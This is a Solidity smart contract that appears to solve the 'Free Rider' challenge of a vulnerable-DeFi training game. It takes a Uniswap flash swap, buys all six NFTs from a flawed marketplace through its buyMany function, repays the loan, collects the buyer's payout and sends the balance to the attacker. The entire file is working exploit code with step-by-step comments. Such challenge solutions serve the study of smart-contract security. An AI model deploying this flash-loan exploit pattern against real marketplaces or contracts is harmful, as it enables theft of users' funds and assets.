pragma solidity ^0.8.0;


import "../free-rider/FreeRiderBuyer.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Uniswap.sol";

// Courtesy of https://github.com/t4sk/defi-by-example/blob/main/contracts/TestUniswapFlashSwap.sol
contract FreeRiderExploit is IERC721Receiver {

    IUniswapV2Pair private pair;
    FreeRiderNFTMarketplace private marketplace;
    IERC721 private immutable nft;
    FreeRiderBuyer private buyer;
    WETH9 private immutable weth;
    address private immutable attacker;

    uint[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _pair,
        address payable _marketplace,
        address _buyer,
        address _nft,
        address payable _weth
    ) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyer = FreeRiderBuyer(_buyer);
        nft = IERC721(_nft);
        weth = WETH9(_weth);
        attacker = msg.sender;
    }
    
    // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external
    function exploit(uint256 _amount) external {
        bytes memory _data = bytes(abi.encodePacked(marketplace)); // any arbitrary data

        // 1. Trigger the swap of 15 worth of WETH to 0 tokens.
        IUniswapV2Pair(pair).swap(
            _amount,        //  WETH
            0,                //  DVT tokens
            address(this),    //  the loaner
            _data
        );

        // 6. now we can transfer the nfts to the buyer for payout
        for (uint i = 0; i < 6; i++) {
            IERC721(nft).safeTransferFrom(
                address(this),  //  the contract
                address(buyer),          //  the buyer 
                i               // the token id
            );
        }

        // 7. transfer all the balance to the attacker
        attacker.call{value: address(this).balance}("");
    }

    // called by the uniswapV2Pair swap
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // 2. This will get called by the swap; withdraw 15 eth.
        weth.withdraw(amount0); // get ETH for the swapped ETH

        // 3. trigger the buying of all NFTs
        marketplace.buyMany{value: amount0}(tokens);

        // 4. calculate the required payback fee and get WETH worth of calculated fee.
        uint256 _fee = 1 + (amount0 * 3) / 997;
        weth.deposit{value: amount0 + _fee}(); // deposit ETH back for WETH

        // 5. transfer back the required WETH of the swap.
        weth.transfer(address(pair), amount0 + _fee);
    }

    // Handles receiving an nft; it's triggered by safeTransferFrom.
    // https://eips.ethereum.org/EIPS/eip-721
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        view
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable {}
}
